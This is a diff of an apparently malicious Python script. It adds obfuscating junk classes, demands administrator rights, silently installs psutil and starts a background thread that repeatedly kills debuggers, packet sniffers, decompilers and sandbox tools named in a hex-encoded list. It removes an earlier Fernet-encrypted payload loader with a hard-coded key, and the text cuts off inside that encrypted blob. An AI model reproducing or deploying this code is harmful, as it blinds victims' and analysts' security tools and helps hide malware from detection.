@@ -1,15 +1,1179 @@
+
+class ObizjDJKkZ:
+    def __init__(self):
+        self.__SwzPOQnSGdeTFS()
+        self.__UEHCuJHhl()
+        self.__ZkUaeDeaAVMuCuUCSz()
+        self.__jLpqoXYKSaEGvFgzGOXV()
+        self.__piXvEyLRgn()
+        self.__AZcVCESujLBzVIFC()
+        self.__uvXFJvAWjD()
+        self.__uTNLLvxUoFABUul()
+        self.__WVeootNL()
+        self.__LXrUfucFNetmjOJGJz()
+        self.__TdBHTrNgDu()
+    def __SwzPOQnSGdeTFS(self, gbOJfRkvFLmEydtW):
+        return self.__AZcVCESujLBzVIFC()
+    def __UEHCuJHhl(self, GmmbXLlPJuQebx, iKjXDWePnVrnxczm, qpucxLhgTZyUCHgZR, YakYLKEoqIYmaEo):
+        return self.__LXrUfucFNetmjOJGJz()
+    def __ZkUaeDeaAVMuCuUCSz(self, jeWpLKcKiUqYry, xUtwZrqkawNo, ccvqgyoYQjfmOxuQww, NMfJVJEnNrzGuOsbUJ, akQvzRRCs, XXODLhwrHNNpk):
+        return self.__jLpqoXYKSaEGvFgzGOXV()
+    def __jLpqoXYKSaEGvFgzGOXV(self, EwZKIzaRpXzbMBAYTmHU, hYZWKiiNPJeB, qmRkdYNGfxNmmBIkw, zethXVQjWxUbA):
+        return self.__jLpqoXYKSaEGvFgzGOXV()
+    def __piXvEyLRgn(self, hgTqaMKU, BSHQSWPaZIjJDKEuxj, BaEEwMuHOKsRGzA, mEuXtAUiXd, PumiMFQOpaXgxutk):
+        return self.__jLpqoXYKSaEGvFgzGOXV()
+    def __AZcVCESujLBzVIFC(self, awPdjKkFzlMsjYNQpeb, bqpKXOi, hgRXngfCiZIshiun, FvBbaMhtLOarLuXVds, vooFRPvaBpjddQQw, puGGToZCBDlZmwdax, OXWLY):
+        return self.__piXvEyLRgn()
+    def __uvXFJvAWjD(self, IjAphVtmNPviUuFomAd, BYJnNDjiqnSN, LiAsopZkAqdiWSEerwu, QoRNc, JluKYG):
+        return self.__WVeootNL()
+    def __uTNLLvxUoFABUul(self, PidbzhtEcRzW):
+        return self.__TdBHTrNgDu()
+    def __WVeootNL(self, JxntcB, sPwazueWUbtB, HzXpUj):
+        return self.__UEHCuJHhl()
+    def __LXrUfucFNetmjOJGJz(self, NswjoClXzE, oUzinLz, ZFrzJBUQEOpV, uOhkbSHMJliJszlUrfeS):
+        return self.__piXvEyLRgn()
+    def __TdBHTrNgDu(self, zQqoJe, gAvnwtPfWI, FAPfOKCdnDGrE, MYXsdBftIleX, atGVdzbMAbVc, oQMqWTtGMF, NwhrFZCw):
+        return self.__UEHCuJHhl()
+class MiOLFBcDnNGAWkgqZXP:
+    def __init__(self):
+        self.__PdaiZUjBNqAR()
+        self.__wwxsdAspZU()
+        self.__CkCOMBHMikLHKZq()
+        self.__flsVrtaBVjZ()
+        self.__szRewTCwiXDNbQQvVPd()
+        self.__tvbXPqxDwIku()
+        self.__ndxRMlGfFXvkoqOxZ()
+    def __PdaiZUjBNqAR(self, eCLgGQ, kzOiyUvbPRcjnCg, snMWQUFWlpzQlpKrL):
+        return self.__flsVrtaBVjZ()
+    def __wwxsdAspZU(self, KdPVIbpXoXsy, BMhBIM):
+        return self.__wwxsdAspZU()
+    def __CkCOMBHMikLHKZq(self, bzhsEOCRLwdjBRbt, AUndNIghxMUeyhn, mLOTSf, AiLdL, KNMso, RhUqxRnaVLbDnc):
+        return self.__ndxRMlGfFXvkoqOxZ()
+    def __flsVrtaBVjZ(self, NjhZZOZQRVACA, qYAImdfzOPomjlKgVqjh):
+        return self.__CkCOMBHMikLHKZq()
+    def __szRewTCwiXDNbQQvVPd(self, aHnGYthsHgpQrKZDs, iCrOhBKnhm):
+        return self.__tvbXPqxDwIku()
+    def __tvbXPqxDwIku(self, dBnXvRskXwSIIQ, CiAdxbadrLnoAB, vbqRHisUCZJyBDy):
+        return self.__CkCOMBHMikLHKZq()
+    def __ndxRMlGfFXvkoqOxZ(self, DuLsgDQzD, dNcVMFMGzygOtNNerSY, XhPJC, JKozgeFVk, KHSiZUQjCcQmsSxNGKYD, DSIExN):
+        return self.__tvbXPqxDwIku()
+class JCjPCithtXGbKMkfot:
+    def __init__(self):
+        self.__SWfwOlFe()
+        self.__QwKxZLcrP()
+        self.__aGJLefXNvFAFi()
+        self.__ZCfIraNEyjhDlK()
+        self.__ZkympuZvfNgeORMbia()
+        self.__gwiMdqku()
+        self.__lHbHajVXpo()
+        self.__FGGDUcixN()
+        self.__AlNDXxDsEkHPScpxlrLJ()
+        self.__RZSYKuGr()
+        self.__irwBPpbkBTJEaWkFn()
+        self.__nloqwqdJwSOEG()
+        self.__JJWGfKHvSLupPJxf()
+        self.__LoWQYEiY()
+    def __SWfwOlFe(self, diiOZqaO, gUvOOorrAGW, CNBaERnelmXStkxhmA, YGSqgl, hUcTr):
+        return self.__JJWGfKHvSLupPJxf()
+    def __QwKxZLcrP(self, oJnLrtfUYZkmi, eqfnYhcuAeSKZ, JXYdxsTmfxVBNWzNy, vVDTQbSpuUzOlAIvbP, UrTyNQfGSEScnJnV, LvlgeNWdDwBshNecTYa):
+        return self.__LoWQYEiY()
+    def __aGJLefXNvFAFi(self, bEHnAjIsPfLEvD, BrsiENKG, EAyTrRVfOgNcWaqQQQBi, pzMOybjrVGMD):
+        return self.__AlNDXxDsEkHPScpxlrLJ()
+    def __ZCfIraNEyjhDlK(self, qlCMxSrJu, RkCNpcHA, XzuwgnBrxy, NbaIeEaKziXoSzaD, xUzMerfiaoLBmu, iCQcbCUWkkmfaS):
+        return self.__nloqwqdJwSOEG()
+    def __ZkympuZvfNgeORMbia(self, jOvUHkUzFKzi, SYERLcVyWkXwokq, jkfZJ, UefPWeRHyUgffStt):
+        return self.__ZkympuZvfNgeORMbia()
+    def __gwiMdqku(self, plnqhMAWwUmoomTRyhnB):
+        return self.__lHbHajVXpo()
+    def __lHbHajVXpo(self, UNlyzjDPEXTyhuTqPA, LErReAYvQrkXFd, pgIIluNbkEO):
+        return self.__RZSYKuGr()
+    def __FGGDUcixN(self, XiivUrtBMHD, vhtBNokMgmZiqK):
+        return self.__FGGDUcixN()
+    def __AlNDXxDsEkHPScpxlrLJ(self, gBiqCeUcvCafrfnknEBx, vFZeQdbWO, keFVsoUaRXI, IeFTBE):
+        return self.__AlNDXxDsEkHPScpxlrLJ()
+    def __RZSYKuGr(self, JxysB, oJZzXb, zFfcPBOou, FnmFyizjcTFxHHaPmdM, CLtsqoqqpkHeI):
+        return self.__AlNDXxDsEkHPScpxlrLJ()
+    def __irwBPpbkBTJEaWkFn(self, IvgHvX, zRNmKzsPIsJiNSPUT, MKtYYg, mergaGBkuyWsrHwAPEmY, hucLXjui, vBobAZrVOwuBURYYCBjr):
+        return self.__aGJLefXNvFAFi()
+    def __nloqwqdJwSOEG(self, GrcBTRlaMesdOGtDegp, CbKzCCGdw, KhYDCECKI, fUBIrZ, DaUoKh):
+        return self.__SWfwOlFe()
+    def __JJWGfKHvSLupPJxf(self, RQrMleLDbKYsm, kfBIKSFzBDDV, ZcxdgrWRnyAsafLHMvjQ, OnLmHyO):
+        return self.__RZSYKuGr()
+    def __LoWQYEiY(self, sUyXX, ziaXEZNLCevJZRgPS, WgdFBAOVeSUdLiSHql, PndUroFHPCxeEUFHK):
+        return self.__ZCfIraNEyjhDlK()
+class YliHUsIgfkjFBI:
+    def __init__(self):
+        self.__phbexadANKb()
+        self.__iLEWKVPuBSAKgdk()
+        self.__ZnsJUKylFuPpu()
+        self.__NpiwDJqsXZL()
+        self.__pbNrWDgoMrFEJ()
+        self.__OwfeGMrCysxQgqqWB()
+    def __phbexadANKb(self, JnxTXsOJeOfgAH, aFnApdMABRfhV, Kaficeem, YAeXbbWakOEMwm, KFaCH, kJkRtdcsSRiw):
+        return self.__phbexadANKb()
+    def __iLEWKVPuBSAKgdk(self, qVnWxvheQwgBQUz):
+        return self.__ZnsJUKylFuPpu()
+    def __ZnsJUKylFuPpu(self, DmxrgFQ, WnBVFvmzIVWkxuGAgIe):
+        return self.__iLEWKVPuBSAKgdk()
+    def __NpiwDJqsXZL(self, dLdqTxoUiXVGhWnA, QItAvJFwkPzy, VQGpGYcQBNxNVVi, wCgXACZJPGNe, kCcSbUVlzKEqvp):
+        return self.__pbNrWDgoMrFEJ()
+    def __pbNrWDgoMrFEJ(self, IBPPXexSGvTrsnRjws, umvDiApKYCxD, yJcnQdXxTGtc, boVgDmBNvlOFqJLvj, VolCVzcDgMlatqmYuWD):
+        return self.__phbexadANKb()
+    def __OwfeGMrCysxQgqqWB(self, TGrRODFoXYmd, ZgtDpVsMEDGvaD):
+        return self.__pbNrWDgoMrFEJ()
+import ctypes, sys
+if not ctypes.windll.shell32.IsUserAnAdmin() != 0:
+    print("Please run this program as administrator.")
+    sys.exit(0)
+import binascii, threading, time
+try:
+    from psutil import process_iter
+except:
+    import os
+    os.system("pip install psutil")
+d = [
+    '53757370656e64', '50726f67726573732054656c6572696b20466964646c657220576562204465627567676572', '466964646c6572', '57697265736861726b',
+    '64756d70636170', '646e537079', '646e5370792d783836', '6368656174656e67696e652d7838365f3634', '4854545044656275676765725549',
+    '50726f636d6f6e', '50726f636d6f6e3634', '50726f636d6f6e363461', '50726f636573734861636b6572',
+    '783332646267', '783634646267', '446f744e657444617461436f6c6c6563746f723332',
+    '446f744e657444617461436f6c6c6563746f723634', '485454504465627567676572537663', '48545450204465627567676572', '696461', '6964613634', '69646167', '696461673634',
+    '69646177', '696461773634', '69646171', '696461713634', '69646175', '696461753634',
+    '7363796c6c61', '7363796c6c615f783634', '7363796c6c615f783836', '70726f74656374696f6e5f6964',
+    '77696e646267', '7265736861636b6572', '496d706f7274524543', '494d4d554e4954594445425547474552',
+    '4d65676144756d706572', '646973617373656d626c79', '4465627567', '5b435055496d6d756e697479',
+    '4d65676144756d70657220312e3020627920436f6465437261636b6572202f20536e44', '436861726c6573', '636861726c6573', '4f4c4c59444247', '496d706f72745f7265636f6e7374727563746f72',
+    '636f6465637261636b6572', '646534646f74', '696c737079', '67726179776f6c66',
+    '73696d706c65617373656d626c796578706c6f726572', '7836346e657464756d706572', '687864',
+    '7065746f6f6c73', '73696d706c65617373656d626c79', '68747470616e616c797a6572', '687474706465627567', '70726f636573736861636b6572', '6d656d6f727965646974', '6d656d6f7279',
+    '646534646f746d6f64646564', '70726f63657373206861636b6572', '70726f63657373206d6f6e69746f72',
+    '717435636f7265', '696461', '696d6d756e697479', '68747470', '74726166666963',
+    '77697265736861726b', '666964646c6572', '7061636b6574', '6861636b6572', '6465627567', '646e737079', '646f747065656b', '646f747472616365', '70726f6364756d70', '6d616e61676572',
+    '6d656d6f7279', '6e65744c696d6974', '6e65744c696d69746572', '73616e64626f78'
+]
+d = [binascii.unhexlify(i.encode()).decode() for i in d]
+def debugger():
+    while True:
+        try:
+            for proc in process_iter():
+                for i in d:
+                    if i.lower() in proc.name().lower():
+                        proc.kill()
+        except Exception:
+            pass
+        time.sleep(0.5)
+threading.Thread(target=debugger, daemon=True).start()
+
+
+class ipZGLguu:
+    def __init__(self):
+        self.__xanBrYSHrihrvYCUv()
+        self.__jJZGOVLzkwYgKKj()
+        self.__RJuuLidGiUVSlqvakG()
+        self.__jXgnXEkzR()
+        self.__ECEUZRTmMwwksMxGEjRP()
+        self.__JNpYWCXGesSG()
+        self.__akUNznQlcVIXGSBvT()
+        self.__uYiEGrRBfSPgShCjO()
+        self.__KAgYqMFJa()
+        self.__nSkkhdupVcDZ()
+        self.__aDVWvKPiUDYxeL()
+    def __xanBrYSHrihrvYCUv(self, TPtcijSTL, oAgbmQGWAqeVmcrvGA, nAJhXSOgceZBOnjM, vbMaEeriRx, OzIdmnrI, uVsXMKiZSXy, ZgrWP):
+        return self.__jXgnXEkzR()
+    def __jJZGOVLzkwYgKKj(self, HekdsewlGYkoWnQiccWS, NifiaaqxWUVKGu, ItqyXSn, AWOKLXSCRQZ, auSELzn, wHbOsTfOWSAwFKq):
+        return self.__jJZGOVLzkwYgKKj()
+    def __RJuuLidGiUVSlqvakG(self, gLfHbpNZf, JGxFZaqqKobRjrbRjKu, CWhITpkwb, iycYJLutPLmCtYFx, WzgakohL, emKiKowm, OrqigILCcDaWx):
+        return self.__RJuuLidGiUVSlqvakG()
+    def __jXgnXEkzR(self, OPyERl, zEsfUDXjmdjf, stMZnT, kvUylTmrrZke, LjWOIE, alPYeDgi):
+        return self.__uYiEGrRBfSPgShCjO()
+    def __ECEUZRTmMwwksMxGEjRP(self, aDKuktpYgLWfAyiRpkk, aLNPldeNVldUzetmbkCy, UmqhfYhJV, FaEExPgKyQoeNV):
+        return self.__ECEUZRTmMwwksMxGEjRP()
+    def __JNpYWCXGesSG(self, aLaBD, aAmvjGuDVsrsTd, PIOoIBSGXSvetDFpgb, PScVD, WSOPpabtXAqwGBTFzVcW):
+        return self.__jXgnXEkzR()
+    def __akUNznQlcVIXGSBvT(self, tkujhEYpD):
+        return self.__uYiEGrRBfSPgShCjO()
+    def __uYiEGrRBfSPgShCjO(self, EUAWdb, KABNHOJKBXNdqepne, irpcqGpyzGOLsVsmHLDt, ChHEoYanj, zsLwjCqqKfaqfEzMX, ocTWJIWkSIEBtUUB, TTLYp):
+        return self.__KAgYqMFJa()
+    def __KAgYqMFJa(self, HscXGu, rFbEmgDrXilcRqfGjGZ, zpOnfWSHEDimqFha):
+        return self.__akUNznQlcVIXGSBvT()
+    def __nSkkhdupVcDZ(self, xHurAya, VxuvgKGSxJpKpriSrW, rtVhcXtgOyIZrp):
+        return self.__jXgnXEkzR()
+    def __aDVWvKPiUDYxeL(self, AEMfyeFbc, NmSLAwLpicumh, AVxCt, CbLwojcTdmjnBgKrusQF, FeeBiBQjuidInl, UpGtLrpy, xEAInQGPWTxVYNof):
+        return self.__jJZGOVLzkwYgKKj()
+class rtHMGcxgfssoTr:
+    def __init__(self):
+        self.__sNMsqyCECWKx()
+        self.__vcdwsoUDsIqjxmdrOac()
+        self.__GksoiFKsLUFsNScvnKcc()
+        self.__kxNJjlIbp()
+        self.__rJAySwBuKlEoYe()
+        self.__noDUnhSLmIWFG()
+        self.__TxxDfCCjeBIREP()
+        self.__gBJHtrPSqJiZ()
+        self.__YhIhNdwyHaAQGjJkHT()
+        self.__RhQqGkINpil()
+        self.__qTEZURQKI()
+        self.__EpgnNseLQiy()
+        self.__rToDTnTAfTyWSVuTK()
+        self.__CQuQUDsY()
+    def __sNMsqyCECWKx(self, slNtqBuaEut, woRgwgiyv, wRTAxLPQEnLZcPEn):
+        return self.__EpgnNseLQiy()
+    def __vcdwsoUDsIqjxmdrOac(self, DfzfODDpYzgfH, VHbRpjjnVbTgfAO):
+        return self.__noDUnhSLmIWFG()
+    def __GksoiFKsLUFsNScvnKcc(self, UckrjXBvIUkdQoE, gIwYgZOKSAuPQAd, yIxGOCbMwppEIKyrcv, GnClCljjjgx, nuiDHFrDs, RTtPo, iRHwwkBqkFEHJtWxdGU):
+        return self.__kxNJjlIbp()
+    def __kxNJjlIbp(self, dxMmTGpBmMjGggsc, KgVoNj, xDilpjMQnmlM, fhuzvulT, UoMovptybdMthlfV):
+        return self.__RhQqGkINpil()
+    def __rJAySwBuKlEoYe(self, cvKVil, bRxopCShMaWuNWjJVVp, wwmAwApFhaKdD, ADpFEKePyOzAeo, PBKwMTaqAOMdDT):
+        return self.__EpgnNseLQiy()
+    def __noDUnhSLmIWFG(self, RxoQGIpHkHqRL, BqcuGaIIh, JvfjGaUfLMHFtNoWTlgx, cVFThctOTvnZdVup, XGwXwnLHUJbNeNj, KgLDngXmMrEwEYjke):
+        return self.__kxNJjlIbp()
+    def __TxxDfCCjeBIREP(self, ncykgBtpTJUNtfTt, WNcVsVANFTKZX, ryImSxmYKtDTvPxlti):
+        return self.__sNMsqyCECWKx()
+    def __gBJHtrPSqJiZ(self, yGKta, evgyKTHedjsZpaZaML, UFbpNHCvLlzUBejmIY, LMRUPhzrtMaBBTkzu, GHMFUgnQkamYlRByHnt, BmrnvVlNzOGdRgqIIgVc, DBFfHzaQItNobsKEMMd):
+        return self.__CQuQUDsY()
+    def __YhIhNdwyHaAQGjJkHT(self, DgiKTIOCpT, DwxKeTpiInFzSi, RmIZnYLzhlHyMxOKdn, IbicEsqgWTCnVqXkBeJa, VFplRxAgQJcdtbOuyOXV, CiyikvXPQEB):
+        return self.__rJAySwBuKlEoYe()
+    def __RhQqGkINpil(self, lweAMhIXFD, mJEtEjBVDtCbkIAGpruO, DCWEJtXV, vfexECDUVbA, TPrxxjNLm):
+        return self.__TxxDfCCjeBIREP()
+    def __qTEZURQKI(self, mrBgGMZtho, vcySQnPjlwxfZV, eHcJVEDOLe, SiovvVn, vNWYFtbRMAUxUF, NQXkPXlIkOtt):
+        return self.__kxNJjlIbp()
+    def __EpgnNseLQiy(self, OhGSHdhdWYRDxFVWF, VOLgyFIcghwruwvPJrNL, xJNxHNumTQgcKGc, wlscTpcvULHYp):
+        return self.__vcdwsoUDsIqjxmdrOac()
+    def __rToDTnTAfTyWSVuTK(self, JiGdizPKF, QdPXedeZEILQF):
+        return self.__RhQqGkINpil()
+    def __CQuQUDsY(self, ZUfiVfEmWHeEKwHegwo, cjGMHZCAZUUnkCLlC, UvzHMSIg, aBrpkwcXDQChtE, uwlagnIEZskKQaaYf, WPZoeweEEIzy):
+        return self.__gBJHtrPSqJiZ()
+class DYltligEJm:
+    def __init__(self):
+        self.__EJGmPdHsmpY()
+        self.__wAfKuZOq()
+        self.__pjypKNcEDFbA()
+        self.__oxfTqnafbcpEk()
+        self.__nxpgiAkmwpWiKLYKQK()
+        self.__ensWGlsoTDQ()
+        self.__XJzxsczgbRUmYiSp()
+        self.__CiiNjQparJ()
+        self.__XaJTxsgRajPqFWC()
+        self.__cYIDTiifbYNtWwCf()
+        self.__WNzXFOZZCdKAAbGaKA()
+        self.__zuVXbPOJt()
+        self.__gwGHouiJciXRSJPG()
+        self.__GsEuCDPpCagdmyMBtI()
+    def __EJGmPdHsmpY(self, VVeOIonbArsMeInqtv, FLkKfRDydz, gychZHJHHOrdDwlmLzCx, ahVqNMDkDRdIyJ, KZWBM):
+        return self.__cYIDTiifbYNtWwCf()
+    def __wAfKuZOq(self, PXcjLwYBVcrM, rBjlSZPyiEwMf, eLtQKKDUimxIvDXuj, rAyFvFiNgZ, WMYJVhuvfCtVSmSqIEXr, kwuCWKuGt):
+        return self.__gwGHouiJciXRSJPG()
+    def __pjypKNcEDFbA(self, krjxJFe, fdfDvnUwtMHW, dyNfZdiikuGQDszM, agoIkBiuOMBxLiF, UXcfTW, STTBAYUMxC, smpIRzQgVUIZRyXZzeXK):
+        return self.__gwGHouiJciXRSJPG()
+    def __oxfTqnafbcpEk(self, CsulNHiirlRtfTtH, NfouImaRgXQbkFawUb, NgJSLpCAOYWwAPaptBEl, mMnORa, ctvDjKg, GHdhlGXrlLdcJPPYF):
+        return self.__cYIDTiifbYNtWwCf()
+    def __nxpgiAkmwpWiKLYKQK(self, QBXiTKtUAQHcCsAFd, VhIXXZeLXpht, rTPmLL):
+        return self.__XaJTxsgRajPqFWC()
+    def __ensWGlsoTDQ(self, tiqxkCkXbCYQZH, eYKGrHZwVlrYxF, NaxBQY, AJzCSeXJzfuYH, HcwahXCgIotDgPTM, mShqFceH, jYjikN):
+        return self.__ensWGlsoTDQ()
+    def __XJzxsczgbRUmYiSp(self, cSIXwRKwtBefDxjG, fdOfORmJSiRfR, LggnhPADwiesSIvTds, mKlkdzgICojnXRUCOz, GFIUyQekhdMW, ovUIUt, iIxgjEwNycHQBa):
+        return self.__XJzxsczgbRUmYiSp()
+    def __CiiNjQparJ(self, ryfokAkaCgnhLpYJ, DnybWyYUwehy, fPYoO, NeVdFDw, uwhIsDVuAcyS, rkWtCqbZdsuFXHtoYg, PaZuNdgDTHLyvCeo):
+        return self.__ensWGlsoTDQ()
+    def __XaJTxsgRajPqFWC(self, DOWGhQWUZCnuB, fUFHBfwjkOVNOQO, GRsfB, iAKAQnCjsbquZ):
+        return self.__EJGmPdHsmpY()
+    def __cYIDTiifbYNtWwCf(self, oTlLseGyoLKMBYJYrG, EhAWhYJAx, JhrZikCvtARORH, FYWoJy, IIZOFtIlRLd, JwkuIRjvonaFQYTIJqRl, MIlLKTar):
+        return self.__pjypKNcEDFbA()
+    def __WNzXFOZZCdKAAbGaKA(self, SEBtzVbfEkVzuCsqB, EVEdCm, Pgtvo, YsGpFpYOWL, HWEwWpUdavpWgsiMCzg, NNHHPYhuTgPnFUdrjddI, ckOPcjefFCDnsTnjP):
+        return self.__zuVXbPOJt()
+    def __zuVXbPOJt(self, DwsCBUMFZpXUANCZ, aaeNWVjKgTbm):
+        return self.__WNzXFOZZCdKAAbGaKA()
+    def __gwGHouiJciXRSJPG(self, DyDkQpnfWyuQANb, pdLKQIv, qnnOBMdqKxdoRegpj):
+        return self.__XJzxsczgbRUmYiSp()
+    def __GsEuCDPpCagdmyMBtI(self, njEUlaYpsb, OuOceUsLaZ):
+        return self.__wAfKuZOq()
 import os
-if not os.path.exists('requirements.txt'):
-    t = "cryptography"
-    with open("requirements.txt", "w") as f:
-        f.write(t)
-try: os.system("pip install -r requirements.txt")
-except: pass
-os.remove("requirements.txt")
-from cryptography.fernet import Fernet
-key = "vsmr39mgm5cV2meiz1rfP2SFmt2BW8XD0oZr1_xF3fI="
-code = """
-gAAAAABksUPLAanX2eGUQS8N5Ew_kuOYOD9E9iviumWCQsU6wr9ehq8JgBVwiWhrLnhgstuCCw2H6-c46ndAKX2pMmLKB1Kr3vB9v7qc34sUkD8TiDNnxIL8UgUSOXpD9pHP9rMv7yy_A1UgQ9WHXXUaNwrCxZ-HpotTrtaw9fjI1Dn_qUKOhLDNaBAf5HxeJhTCBGTPgC41OJMR74Gt4FQU2LsOM7BWivXxDQktl5JG-tHdVCn8S_rD3w0FhgvDADZdPNvwID2F-sKEymjgs6YUhPpOXV01hR9dJgkyMitax1MrcoaHHUJ0MOHulxkfmXnQNsRnbP-PXCNCoGIb6NHv9wJ5DHxIizngceLWrPe-_RBHRu5WSojN0XGJyuvxeP-_Me_kDfALhuN6SlaJ08dA9yOeHQceYl_wAp33fEZJYBPTJ6v0xO8KeCfR9KmojGQbCSfrZCxTLkLY5qAT04ciyr2yHJy2TEJ6hkGO3eiFOUAOq0_rXGxxAugernanaQp5u49XYzJ2X2hNXXWpclAcBQm0oJj1h5Vn9o9feTf3Tfn2WyM_L465ZdCSpyDZIJX72sOXRRwRlr5G0ZL0GzYuatFcJxZi5O4_7xUffqEfsFMSsn0vXUTZtt7RpV_NmtoCDraR8Pe4_SiuTnAK0UqW_TPJoUrkFTLvvKF29YsFulUc6mb1vtcM780QH63_jWpvyy88gIQC-fp-wK1hVAwxo0-yXkibSHeudzaUkJLkrALX_mwFZ8pExF-CW20PfNVGvW5l0KAzMlxMKvJx-oY4vpcJvghP-phs7R6soer7IQ6cTQCnwrUxAtgYqT_cdHxdTAbHfPG2A8iqvifz6Zofwnvvy-VcTCU97Jvi_o5N08NpxbE7PEhHSoNOd5XP3gHeZ1mIt-rDSo9d7k_W3G4HwvRf2p6oYYuffu3ujC2mCDBAiyHy3gY4mjiaBbjvLPex7ld2NOVE3TKpPnr1uvKujza6ESL3JF88XPQps8kzoIMcM9QYNk4Y_BA0mtOfeuN3godsLjGu6LgwPPXkZ-BHdcXyo9WyNxy-CWszhuHDbjupMzLrKnyB7ytV7kvP-VC5kaZm3bwFVZfg1Kljau22qDmK6eBOtYHywPxDGInW-XrnUqOROV30-P5KmDK4CHd_vPnDMg4vEETaFePcv8XPUrovaj9ukOnXuBgxRO-96foJvhQYn5Ji6xkR-8FCL3yqmCieTYWomR02scofTING4YSckZUAHd6H88TEXOS5EHFnDLT-abrr2cAsfl25wFf5aaotSh_tnVRgbaf2QUL468d2nb2-qksDS6WsgoG1qCEaqwVhJ_190cPVGBNb2KmRZKulUgEOCDsdOGg691wZjhtqwr9cRrmsAdLDnS8NqJsq1sghytTG9XGQzew_HmebHQqqlaEBcCm451Bv0azwLIDbRXquKMgxCqRAiJP2ft3SWTds7sgKu44I9mDVP_h8cnedUEZEqSIAG_0CDI4o_Hf-IgdxELkeAibGB3o-8nppdMZWuTgRKjehtW7ByrO7-v9qjQQehULISP3cO8DyrmVwHN8Ia_znJGUSHCxQVtg2UDi37C8kki13L2qMDnD3SA13mHdsz5LPQcSIgHJzK5-JQh7UYt1ltuQFPGxfMFMg-ayXFQ3e7WwgWShHfsrRlruHfQ0UvVG2LrNp3AMFRGTDzuvto6DboKOzCf2c4uBL4fE0dN20JW0du12LqTXEYNJk9ty1O4fXLTZMBCwpjbaq1Nk5g3iYWWY_jJR8Bljs425J1Y5XPZi1WuxCuZOsDUmpy8NNAhJacoT-Swn5QKikw1yTDuBJcYXMIW_A3sFWD9EsNCR0p4zbwJpcx3fEyBLLyZT5-yTwKTVMEqAg6UXgBtRFGM3tJWtd6-0CGEqp-74pm-0Xpp3IWHClYobRCePBv8LuOpa6oKIo-E_pMg-Uxo7vUZ1OXpZJ2ssNqgrQUpd1EzkyWd1ifNMfZu1g0L8QPAyNU1INxCoRIwa8IRRo-mUDNNhBgaD6UJQ2aa1_Lis0DXtoiRWqQ6wfXUVSfEQ9kCMdcrhcrT-wla2PJAgM1_7R6PCcyFleGlcfWeNRiejCxySPULZHfVreWLv44X8BL-E-n48hLuHDn2mOIyYucCJ__5xFkMdu-eyGE_2XIyjEZdWDKfve1nhsaiKEMkFZZ0-2M7feV-VRaWQq3Rq2b2FPkeTk6Y0I2sMaWmKGh0QXQ-vG-o1ISKB9ioxoj80Htlz8tCBFs6sxeg4fAeLyWAKL5r1dpVnG3ahcbkPEXHYZqiksPpPRD36srKYxilQ8iKozEW-d-y5pxE7JP8wpRUmIOwokvR9qVnwwXmM53zoZ_Skg5p9cZ2SY07YwdmgDujMiooFdKb9hAEMmTOqZhwfIo_FZWpvc-Qwo3XdmFUxhq1s5w_d4Avo-SuqfHVjXK8jOf7X3kHZPryHAXs77VqRA9lX1Cx_IkgN-1aCIFxlZwG5OJR9t84Wwnx7G3wg-fgQ8FsEaaBg8X0wEtj-1uBGB51ySwPIstjdVnSBVITxdD-r69hjPUaQk4xCzBPWVscRtYU_w-YodzJTa7LsUTnV-vyhK-QViDRSZ5DowZmV7VOReE84CN0el4daMC6vPUbpoPks4p1x2cWmyszul9Lcqpi83y0MTCmrQrj5KrK01VQQ7QivotABUvsLR3ub6q1HLwEUtJpWdxOO254mSA2F8-_lYU2R2oHWoTSq_QKiT_pgYK1KnR_w13L4C7Z-3gPcAmH838aooD3G8C1LzduRYKB37_cWFSNK_g_UYnBn4T52z-Itc04LnP49x8LPRpaJFp2UxY8rQd0ZRgKkRBkpho4DfPkndNIggrBj4oAP-pVWyPtnUfXska0_-ahDiTFG3A1FHfOGBNGRjNcUU9Db3ublickQvAerJOftQ-pi_XT6jfvaAeey130HTncyYc7sY3SgQwQKif-AjaV5V9P_F_CYL_2qQj92hGTZvmg5BStLZuFDDp59LLAhYVHX-D6-xNBcGgzlRqdPYoNmygc3tJR11zdm3h-GjBujKfHdegB7jetjYY4iBmDYUiMVYIhYiXuw6_1sqAfNSqQwQ6j4eWMcp6rpbPNko7thpHv_3iGx5niNuxVMhNpt2pmsyGc580qTCoLVYZwm94NWxV8f8WrrxlFqDLEWKR38SOXp9qWVo3qk2HAbmmN7zeuu4RdLghYP6eNIhQpEpNqLCYhwjN1hh8xn3dObYHYa4Vedh3GHkug6b4FTgmzcna0nt1R4E4l-qQORMCIemwEo4rfI_JdgKk-69R6ijtDLJX5o5OEgJgaEPnJ-1UOQPmBliubb-7sItvE9J18acYLt2zZK3M3VkhzhWUB08cpnp-eCFp-ffokZuv_60kEg9hc72bZexXynj0jTzVqHF6K86JcmoA_623nuAvdNnY_xza3aLeoCGpA99yKedZIU00RmDV2VAfcPOPFoZ5DEoP8YXGgEK0E61hmOP-iv2ZBDjMcuFzWZYHcPsQrVbsnKm1iA1gaNP0DrMQ9YZEFVMsBcq6cIr3kazK0Lx98I7tKALWxRqbdszzOCqS_DB0DpjMQLMbxYrBAepZv5syGcSzL7E-s2Bg5nOzcmkuE3MdTEiHKZMa4WuPuoO8al0M2vbvpFpJa3J-KBN6Tk7qcyB8CKBZJmXkzGMN4ZOM_QcyAlmFw1_LebIyUhdWAjnJT4Hg-bdmKSeVhP2Bo6tZXDtnZb6N5yABDYil7FqBhdlrNB4Va4aGJHKoSMY0EY6rJmRcVP6H4DivVB6uepqMvnG-S1frLE8jLPD8cGsCkmbcWeEmwybiztwpOQbbj1SiNI82T_n1LQOp3Va1Os52_xv9KH7sflCH5PqlCeh-ToBBosvAH-w_lGfy1DMFn1-wgMJ4S3Xi80mKVTQmPqRbUkQyeXiFOloIn2SPQyA7vPcGKmAbNRjlbil9OMPZvwzSWYuTl5UFezUFdfStAGDUJ3S1a_y5ZDg_zkSkGllmUy0xaF3-w7o3aqfwOFJHF8OFYZ8xXQQERC3sd4pjbE2vyvSBpEReGU1l31MMrUrMFTYbulK0b68DeuW0QAmInC4p_NNnwXMZ0OUZ3IjJbCHBCvzmsb-qygO8_TA6TITf1zKRSfWXupr09KLJR0XNhp5cYZgd-koxDDHbSTSNgfsodYdZc0S_FM0fy2Ni98_-lmo4DtkgTQL6uZaA-3wVu9VJ6sFodm4VDa2Emw_JYpi4qJxTQ15YKuksB-WQWE12Qm3kkRM4N2KDoi_e684KUfxx10EwBUlJ7IujQmwGawC8SlwpMHFz5OqY1gj5g3wytm57SCSg6Ql4cFOaBOvtbA5C3050G_Ktq0s7HFSfP-5HeGsPFjajoJQwcSD8UMCcyP8U2j5xPnc1uWnhurq4JrALll2DlnI8lzA_O-D-Mptzr-BXvektkUMQ7Uw8Wi0Xu-F